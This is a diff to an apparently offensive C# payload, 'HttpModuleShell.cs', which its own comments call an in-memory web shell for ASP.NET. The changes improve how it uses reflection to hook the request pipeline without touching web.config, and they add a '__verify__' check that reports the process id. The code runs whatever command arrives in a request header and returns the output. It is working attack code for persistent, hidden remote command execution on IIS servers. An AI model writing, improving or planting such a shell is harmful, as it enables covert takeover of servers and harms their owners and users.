@@ -1,4 +1,4 @@
-// payloads/HttpModuleShell.cs
+﻿// payloads/HttpModuleShell.cs
 // ---------------------------------------------------------------------------
 // Memory shell #1: HttpApplication module-event pipeline (no web.config change).
 //
@@ -68,17 +68,29 @@ public class E
             MethodInfo getC = t.GetMethod("GetModuleContainer", F);
             if (getC == null) return false;
 
+            // Prefer modules whose container is known to process BeginRequest early; fall back
+            // to enumerating the module collection.
             object container = null;
-            FieldInfo mcF = t.GetField("_moduleCollection", F);
-            object mc = mcF != null ? mcF.GetValue(app) : null;
-            if (mc != null)
+            string[] preferred = new string[] {
+                "Session", "AspNetFilterModule", "DefaultAuthentication", "UrlRoutingModule-4.0"
+            };
+            foreach (string k in preferred)
             {
-                string[] keys = (string[])mc.GetType().GetProperty("AllKeys").GetValue(mc, null);
-                foreach (string k in keys)
+                try { container = getC.Invoke(app, new object[] { k }); } catch { }
+                if (container != null) break;
+            }
+            if (container == null)
+            {
+                FieldInfo mcF = t.GetField("_moduleCollection", F);
+                object mc = mcF != null ? mcF.GetValue(app) : null;
+                if (mc != null)
                 {
-                    try { container = getC.Invoke(app, new object[] { k }); }
-                    catch { }
-                    if (container != null) break;
+                    string[] keys = (string[])mc.GetType().GetProperty("AllKeys").GetValue(mc, null);
+                    foreach (string k in keys)
+                    {
+                        try { container = getC.Invoke(app, new object[] { k }); } catch { }
+                        if (container != null) break;
+                    }
                 }
             }
             if (container == null) return false;
@@ -91,7 +103,7 @@ public class E
                 if (mi.Name == "AddEvent") { addEvent = mi; break; }
             if (addEvent == null) return false;
 
-            addEvent.Invoke(container, new object[] { RequestNotification.BeginRequest, false, step });
+            addEvent.Invoke(container, new object[] { RequestNotification.AcquireRequestState, false, step });
             return true;
         }
         catch { return false; }
@@ -144,6 +156,15 @@ public class E
             string cmd = ctx.Request.Headers[CmdHeader];
             if (string.IsNullOrEmpty(cmd)) return;
 
+            if (cmd == "__verify__")
+            {
+                ctx.Response.Write("armed; integrated=" + HttpRuntime.UsingIntegratedPipeline
+                    + "; pid=" + Process.GetCurrentProcess().Id);
+                ctx.Response.Flush();
+                ctx.Response.End();
+                return;
+            }
+
             ctx.Server.ClearError();
             ctx.Response.Clear();
             ctx.Response.Write(Exec(cmd));
@@ -172,3 +193,5 @@ public class E
         catch (Exception ex) { return ex.Message; }
     }
 }
+
+
